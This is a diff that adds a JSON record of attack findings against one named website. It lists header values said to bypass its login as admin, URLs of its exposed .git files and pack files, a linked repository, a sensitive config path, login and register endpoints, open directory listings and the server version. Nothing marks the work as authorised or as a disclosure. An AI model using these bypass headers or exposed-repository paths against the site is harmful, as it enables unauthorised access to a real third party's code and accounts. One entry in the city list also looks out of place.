@@ -1,0 +1,54 @@
+{
+  "xss_payloads_tested": [],
+  "ssti_payloads_tested": [],
+  "csrf_token_found": false,
+  "auth_bypass": {
+    "method": "X-User header injection",
+    "working_headers": [
+      "X-User: admin",
+      "X-User: 1", 
+      "X-User-ID: 1",
+      "X-Username: admin",
+      "X-Auth: admin",
+      "Authorization: Bearer admin"
+    ]
+  },
+  "git_exposed": true,
+  "git_urls": {
+    "config": "https://tyl777.com/.git/config",
+    "head": "https://tyl777.com/.git/HEAD",
+    "master_ref": "https://tyl777.com/.git/refs/heads/master"
+  },
+  "gitlab_repo": "https://gitlab.com/dacn/tyl777.git",
+  "git_pack_files_exposed": [
+    "pack-187a47768b86ad91920caf3afabcad995cbc5d40.pack (9.7MB)",
+    "pack-191cf777d001740f5722598eb9212052859b2e9e.pack (6.5MB)"
+  ],
+  "gitignore_exposed": {
+    "path": "https://tyl777.com/.gitignore",
+    "sensitive_files": ["model/systemConfig.php", "wp-content", "docs/left_images/*.jpg"]
+  },
+  "api_endpoints": {
+    "login": {
+      "path": "/action/custom/login",
+      "method": "POST",
+      "status": 200,
+      "requires_verify_code": true
+    },
+    "register": {
+      "path": "/action/custom/register",
+      "method": "POST",
+      "status": 200,
+      "requires_verify_code": true
+    },
+    "getCity": {
+      "path": "/action/tool/getCity",
+      "method": "GET",
+      "status": 200,
+      "response_type": "json_array",
+      "content": ["臺北","新北","基隆","桃園","新竹","荃津","臺中","彰化","南投","豐原","嘉義","台南","高雄","屏東","宜蘭","花蓮","臺東"]
+    }
+  },
+  "directory_listing_exposed": ["/docs/", "/model/"],
+  "server_info": "Apache/2.4.41 (Ubuntu)"
+}
